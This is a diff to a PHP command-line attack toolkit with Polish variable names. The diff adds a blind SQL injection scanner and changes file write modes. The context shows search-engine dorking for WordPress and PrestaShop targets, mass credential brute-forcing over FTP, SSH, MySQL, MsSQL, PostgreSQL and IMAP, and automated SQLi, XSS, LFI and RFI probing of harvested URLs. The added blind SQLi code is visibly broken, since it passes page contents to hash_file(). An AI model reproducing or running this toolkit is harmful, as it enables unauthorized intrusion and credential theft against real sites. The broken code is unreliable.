@@ -23,6 +23,7 @@ TODO:
 
 set_time_limit(0);
 error_reporting(0);
+mkdir('out', 0755);
 
 
 function options() {
@@ -82,7 +83,7 @@ if($serv == 2) {
 
 	print "\nGrabbing!\n\n";
 
-	$fp = fopen('out/'.$filename, 'a');
+	$fp = fopen('out/'.$filename, 'a+');
 	for($i=0;$i<$start;$i++) {
 
 	$url = 	"http://ajax.googleapis.com/ajax/services/search/web?v=1.0&q=".urlencode($dork)."&start=".$i;
@@ -102,7 +103,7 @@ if($serv == 2) {
 
 elseif($serv == 4) {
 
-    $fp = fopen('out/'.$filename, 'a');
+    $fp = fopen('out/'.$filename, 'a+');
     for($i=0; $i <= $start; $i++) {
 
     $url =  "http://szukaj.onet.pl/0,".$i.",query.html?qt=".urlencode($dork);
@@ -128,7 +129,7 @@ elseif($serv == 3) {
 
 	print "\nGrabbing!\n\n";
 
-	$fp = fopen('out/'.$filename, 'a');
+	$fp = fopen('out/'.$filename, 'a+');
 
 for($i = 0; $i <= $start; $i++) {
 
@@ -150,7 +151,7 @@ fclose($fp);
 
 	print "\nGrabbing!\n\n";
 
-	$fp = fopen('out/'.$filename, 'a');
+	$fp = fopen('out/'.$filename, 'a+');
 
 for($i = 0; $i <= $start; $i++) {
 $url ='http://www.google.interia.pl/szukaj,q,'.urlencode($dork).',w,,p,'.$i;
@@ -215,7 +216,7 @@ $output = trim($out);
 if($lin == 'wp') {
 
 print "\nGrabbing!\n\n";
-$fp = fopen('out/'.$output.'-tmp.txt', 'a');
+$fp = fopen('out/'.$output.'-tmp.txt', 'a+');
 $dork = 'site:'.$domain.' inurl:"wp-includes/rss-functions.php"';
 
 for($i=0;$i<$page;$i++) {
@@ -245,7 +246,7 @@ print "\nDone! Saved as ".$output.".txt!";
 if($lin == 'presta') {
 
 print "\nGrabbing!\n\n";
-$fp = fopen('out/'.$output.'-tmp.txt', 'a');
+$fp = fopen('out/'.$output.'-tmp.txt', 'a+');
 $dork = 'site:'.$domain.' inurl:footer.php OR inurl:header.php intext:"FrontController"';
 
 for($i=0;$i<$page;$i++) {
@@ -345,7 +346,7 @@ elseif($czk == 2) {
         $ftpconn = ftp_connect(long2ip($ip));
         if(ftp_login($ftpconn, 'anonymous', '')) {
         	$text = date('j/y - G:i') . " - FTP - " . long2ip($ip) . " - Anonymous login\n";
-    		$handle = fopen('out/multibruter.txt', 'a');
+    		$handle = fopen('out/multibruter.txt', 'a+');
     		fwrite($handle, $text);
     		fclose($handle);
 
@@ -369,7 +370,7 @@ elseif($czk == 2) {
                     $ftpconn = ftp_connect(long2ip($ip));
                         if(ftp_login($ftpconn, $ftpuser, $haslo)) {
             $text = date('j/y - G:i') . " - FTP - " . long2ip($ip) . " - ".$ftpuser.":".$haslo."\n";
-    		$handle = fopen('out/multibruter.txt', 'a');
+    		$handle = fopen('out/multibruter.txt', 'a+');
     		fwrite($handle, $text);
     		fclose($handle);
 
@@ -411,7 +412,7 @@ elseif($czk == 2) {
           {
         print "\033[1;37m" . $uzytkownik . ':' . $haslo . " - Success! \033[0;37m\n";
              $text = date('j/y - G:i') . " - SSH - " . long2ip($ip) . " - ".$uzytkownik.":".$haslo."\n";
-    		$handle = fopen('out/multibruter.txt', 'a');
+    		$handle = fopen('out/multibruter.txt', 'a+');
     		fwrite($handle, $text);
     		fclose($handle);
         ssh2_exec($sshconn, 'exit');
@@ -441,7 +442,7 @@ elseif($czk == 2) {
 
               print "\033[1;37m" . $mssqluser . ':' . $haslo . " - Success! \033[0;37m\n";
              $text = date('j/y - G:i') . " - MsSQL - " . long2ip($ip) . " - ".$mssqluser.":".$haslo."\n";
-    		$handle = fopen('out/multibruter.txt', 'a');
+    		$handle = fopen('out/multibruter.txt', 'a+');
     		fwrite($handle, $text);
     		fclose($handle);
 
@@ -464,7 +465,7 @@ elseif($czk == 2) {
 
             print "\033[1;37m" . $uzytkownik . ':' . $haslo . " - Success! \033[0;37m\n";
             $text = date('j/y - G:i') . " - MySQL - " . long2ip($ip) . " - ".$mssqluser.":".$haslo."\n";
-    		$handle = fopen('out/multibruter.txt', 'a');
+    		$handle = fopen('out/multibruter.txt', 'a+');
     		fwrite($handle, $text);
     		fclose($handle);
 
@@ -507,7 +508,7 @@ elseif($czk == 2) {
 
              print "\033[1;37m" . $pguser . ':' . $haslo . " - Success! \033[0;37m\n";
             $text = date('j/y - G:i') . " - PgSQL - " . long2ip($ip) . " - ".$pguser.":".$haslo."\n";
-    		$handle = fopen('out/multibruter.txt', 'a');
+    		$handle = fopen('out/multibruter.txt', 'a+');
     		fwrite($handle, $text);
     		fclose($handle);
 
@@ -537,7 +538,7 @@ elseif($czk == 2) {
                     if ($mailbox) {
              print "\033[1;37m" . $uzytkownik . ':' . $haslo . " - Success! \033[0;37m\n";
              $text = date('j/y - G:i') . " - IMAP - " . long2ip($ip) . " - ".$uzytkownik.":".$haslo."\n";
-    		$handle = fopen('out/multibruter.txt', 'a');
+    		$handle = fopen('out/multibruter.txt', 'a+');
     		fwrite($handle, $text);
     		fclose($handle);
             imap_close($mailbox);
@@ -596,7 +597,7 @@ print "\n [+] Trying ".$url['host']." (".gethostbyname($url['host']).") with use
           {
         print "\033[1;37m" . $uzytkownik . ':' . $haslo . " - Success! \033[0;37m\n";
              $text = date('j/y - G:i') . " - SSH - " . gethostbyname($url['host']) . " - ".$uzytkownik.":".$haslo."\n";
-            $handle = fopen('out/brutedfpds.txt', 'a');
+            $handle = fopen('out/brutedfpds.txt', 'a+');
             fwrite($handle, $text);
             fclose($handle);
         ssh2_exec($sshconn, 'exit');
@@ -674,7 +675,7 @@ if(preg_match_all("'<a.*?href=\"(http[s]*://[^>\"]*?)\"[^>]*?>(.*?)</a>'si", fil
 	array_pop($all_hrefs);
 	foreach($all_hrefs as $href) {
 		if($yo == 2 || $yo == 3) {
-		$fp = fopen('out/'.'d0rks.txt', 'a');
+		$fp = fopen('out/'.'d0rks.txt', 'a+');
 		$text = date('j/y - G:i') . " - " . urldecode($href);
 		fwrite($fp, $text."\n");
 		fclose($fp);
@@ -793,7 +794,7 @@ function filter() {
 		foreach($urls as $url) {
 	//	if (preg_match("/(filmweb)/(forum)/(hip-hop.pl)/(youtube)/(facebook)|(lastfm)/(github)/(wikipedia)/(stackoverflow)/(wykop)/(allegro)/", $url) == FALSE && strpos($url, "="))  {
 	if (preg_match('#\b(filmweb|forum|google|reddit|hip-hop.pl|youtube|facebook|lastfm|github|wikipedia|stackoverflow|wykop|allegro|phpbb|simplemachines|smf)\b#', $url) == FALSE && strpos($url, "="))  {
-		$fp = fopen('out/filtered-'.$file, 'a');
+		$fp = fopen('out/filtered-'.$file, 'a+');
 		fwrite($fp, $url."\n");	
 		fclose($fp);
 		} 
@@ -835,7 +836,7 @@ if(preg_match_all("'<a.*?href=\"(http[s]*://[^>\"]*?)\"[^>]*?>(.*?)</a>'si", fil
 	unset($all_hrefs[6]);
 	array_pop($all_hrefs);
 	foreach($all_hrefs as $href) {
-		$fp = fopen('out/'.$output, 'a');
+		$fp = fopen('out/'.$output, 'a+');
 		$text =  urldecode($href)."\n";
 		fwrite($fp, $text);
 		print " - ".urldecode($href)."\n";
@@ -853,10 +854,52 @@ if(preg_match_all("'<a.*?href=\"(http[s]*://[^>\"]*?)\"[^>]*?>(.*?)</a>'si", fil
 
 }
 
+function blind_sqli($link) {
+	$cleanHashCode = hash_file(file_get_contents($link));
+		
+	//first check if website is dynamic
+	if($cleanHashCode == hash_file(file_get_contents($link)))
+	{
+	
+		if(strpos($link, '=') !== false) {
+			$urls = array();
+			$params = explode("?", $link);
+			$params = explode("&", $params[1]);
+			foreach($params as $param)
+			{
+				$KeyValuePair = explode("=",$param);
+				$urls[] .= str_replace($param, $KeyValuePair[0] . "=" . $KeyValuePair[1] . " and 1 = 1", $link); //We should add possibilitys of pre- and suffixes
+				$urls[] .= str_replace($param, $KeyValuePair[0] . "=" . $KeyValuePair[1] . " and 1 = 2", $link);
+			}
+			
+			for($i = 0; $i < count($urls); $i+=2)
+			{
+				$true = $urls[$i];
+				$false = $urls[$i+1];
+				
+				if($cleanHashCode == hash_file(file_get_contents($true)))
+				{
+					if($cleanHashCode != hash_file(file_get_contents($false)))
+					{
+						$text = $urls[$i] . "\n";
+						$handle = fopen('out/sqli.txt', 'a+');
+						fwrite($handle, $text);
+						fclose($handle);
+						print "\033[1;37m1\033[0;37m";
+					}
+					else {
+						print '0';
+					}
+				}
+			}
+		}
+	}
+	else {
+		print '0';
+	}
+}		
 
 function sqli($link) {
-
-
 if(strpos($link, '=') !== false) {
    	$linki = array();
     $zmienne = explode("?",  $link);
@@ -870,7 +913,7 @@ if(strpos($link, '=') !== false) {
         $reg = "/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error|SQL command not properly ended|Microsoft SQL Native Client error|Query failed: ERROR: syntax error/i";
     	if (preg_match($reg, file_get_contents($lin)) && !preg_match($reg, file_get_contents($link)))  {
     		$text = $lin . "\n";
-    		$handle = fopen('out/sqli.txt', 'a');
+    		$handle = fopen('out/sqli.txt', 'a+');
     		fwrite($handle, $text);
     		fclose($handle);
     		print "\033[1;37m1\033[0;37m";
@@ -886,7 +929,7 @@ $url = $link . "'";
 
   	if(preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error|SQL command not properly ended|Microsoft SQL Native Client error|Query failed: ERROR: syntax error/i", file_get_contents($url))) {
     		$text = $url . "\n";
-    		$handle = fopen('out/sqli.txt', 'a');
+    		$handle = fopen('out/sqli.txt', 'a+');
     		fwrite($handle, $text);
        		fclose($handle);
     		print "\033[1;37mI\033[0;37m";
@@ -918,7 +961,7 @@ if(strpos($link, '=') !== false) {
     foreach($linki as $lin) {
     	if (strpos(file_get_contents($lin), "<script>alert(6661337);</script>"))  {
     		$text = urldecode($lin) . "\n";
-    		$handle = fopen('out/xss.txt', 'a');
+    		$handle = fopen('out/xss.txt', 'a+');
     		fwrite($handle, $text);
        		fclose($handle);
     		print "\033[1;37m1\033[0;37m";
@@ -936,7 +979,7 @@ $url = $link . "'>\"><script>alert(6661337);</script>";
 
   	if(strpos(url_get_contents($url), "<script>alert(6661337);</script>")) {
     		$text = $url . "\n";
-    		$handle = fopen('out/xss.txt', 'a');
+    		$handle = fopen('out/xss.txt', 'a+');
     		fwrite($handle, $text);
        		fclose($handle);
     		print "\033[1;37mI\033[0;37m";
@@ -1008,7 +1051,7 @@ if(strpos($link, '=') !== false) {
     foreach($linki as $lin) {
     	if (preg_match("/root:x:/", file_get_contents($lin)))  {
     		$text = $lin . "\n";
-    		$handle = fopen('out/lfi.txt', 'a');
+    		$handle = fopen('out/lfi.txt', 'a+');
     		fwrite($handle, $text);
     	    fclose($handle);
     		print "\033[1;37m1\033[0;37m";
@@ -1037,7 +1080,7 @@ if(strpos($link, '=') !== false) {
     foreach($linki as $lin) {
     	if (strpos(file_get_contents($lin), "Hauru Shell"))  {
     		$text = $lin . "\n";
-    		$handle = fopen('out/rfi.txt', 'a');
+    		$handle = fopen('out/rfi.txt', 'a+');
     		fwrite($handle, $text);
             fclose($handle);
     		print "\033[1;37m1\033[0;37m";
@@ -1101,7 +1144,7 @@ if ($entry != "." && $entry != "..") {
 
 $f=0;
 
-$fp = fopen($path.$entry, 'r');
+$fp = fopen($path.$entry, 'a+');
 flock($fp, 1);
 while(!feof($fp))
 {
@@ -1169,11 +1212,12 @@ if(!file_exists('out')) {
 function scan() {
 
 print "\n  Options:\n";
-print "    sqli - SQL Injection\n";
-print "    xss - Cross Site Scripting\n";
-print "    lfi - Local File Inclusion\n";
-print "    rfi - Remote File Inclusion\n";
-print "    all - Fuck shit up\n";
+print "    sqli 		- SQL Injection\n";
+print "    blind_sqli 		- Blind SQL Injection\n";
+print "    xss 			- Cross Site Scripting\n";
+print "    lfi 			- Local File Inclusion\n";
+print "    rfi 			- Remote File Inclusion\n";
+print "    all 			- Fuck shit up\n";
 print "     What: ";
 
 $choice = fopen ("php://stdin","r");
@@ -1195,6 +1239,15 @@ if(trim($what) == 'sqli' || trim($what) == 'all' || trim($what) == 'sqli&xss') {
     	sqli(urldecode($link));
     }
 
+}
+
+if(trim($what) == 'blind_sqli' || trim($what) == 'all' || trim($what) == 'blind_sqli&xss' || trim($what) == 'sqli&blind_sqli&xss') {
+
+	print "\n\n - Testing Blind SQL Injection for " .count(file('out/'.$whatf)). " parameters ($whatf)\n";
+	$urls = file('out/'.$whatf);
+    foreach($urls as $link) {
+    	blind_sqli(urldecode($link));
+    }
 }
 
 if(trim($what) == 'xss' || trim($what) == 'all' || trim($what) == 'sqli&xss') {
